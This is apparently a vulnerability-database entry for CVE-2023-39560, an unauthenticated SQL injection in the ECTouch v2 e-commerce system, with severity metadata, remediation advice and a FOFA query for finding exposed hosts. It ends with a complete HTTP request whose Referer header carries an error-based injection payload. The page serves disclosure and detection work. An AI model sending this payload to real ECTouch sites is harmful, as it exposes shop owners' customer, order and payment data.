---
layout: post
cve_id: CVE-2023-39560
title: ECTouch v2 - SQL Injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-39560.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-39560.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: critical
impact: 'Unauthenticated attackers can exploit SQL injection through the $arr[''id'']
  parameter to extract database contents, potentially stealing customer data, order
  information, and payment details from the ECTouch e-commerce system.

  '
remediation: 'Update ECTouch to a version newer than 2.0 that uses parameterized queries
  or prepared statements for the id parameter in default/helpers/insert.php.

  '
reference:
- https://wiki.bachang.org/doc/2582/
- https://nvd.nist.gov/vuln/detail/CVE-2023-39560
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-39560
  cwe-id: CWE-89
  epss-score: 0.60798
  epss-percentile: 0.98226
  cpe: cpe:2.3:a:ectouch:ectouch:2.0:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: ectouch
  product: ectouch
  fofa-query: icon_hash="127711143"
tags:
- cve
- cve2023
- ectouch
- sqli
- vuln
---

## üîç Vulnerability Description
ECTouch v2 was discovered to contain a SQL injection vulnerability via the $arr['id'] parameter at \default\helpers\insert.php.


## üåê HTTP Request
```nohighlight
GET /index.php?m=default&c=user&a=register&u=0 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Connection: close
Referer: 554fcae493e564ee0dc75bdf2ebf94cabought_notes|a:1:{s:2:"id";s:49:"0&&updatexml(1,concat(0x7e,(database()),0x7e),1)#";}
Accept-Encoding: gzip
```

